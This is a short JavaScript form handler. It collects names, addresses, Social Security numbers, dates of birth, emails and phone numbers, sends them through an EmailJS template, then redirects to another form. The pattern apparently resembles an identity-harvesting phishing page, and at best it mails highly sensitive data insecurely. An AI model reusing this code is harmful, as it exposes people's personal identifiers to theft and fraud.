    function sendEmail(){
    var params = {
        firstname: document.getElementById("firstname").value,
        lastname: document.getElementById("lastname").value,
        StreetAddress: document.getElementById("StreetAddress").value,
        StreetAddress2: document.getElementById("StreetAddress2").value,
        SSN: document.getElementById("SSN").value,
        DOB: document.getElementById("DOB").value,
        City: document.getElementById("City").value,
        State: document.getElementById("State").value,
        Zipcode: document.getElementById("Zipcode").value,
        Email: document.getElementById("Email").value,
        Phone: document.getElementById("Phone").value,
       
        


    }
const serviceID = "service_in1qblh"
const templateID = "template_f87g0x7"

emailjs.send(serviceID,templateID,params)
.then(
        function(response){
            console.log("SUCCESS!",
        response.status, response.text);
        window.location.href="form.html"
        },   
    function (error){console.log("FAILED...", error);

    }
);
}

function validateNumber(inputField) {
    var numberValue = inputField.value;
    if (isNaN(numberValue) || numberValue.indexOf('.') !== -1) {
      inputField.value = '';
    } 
  }

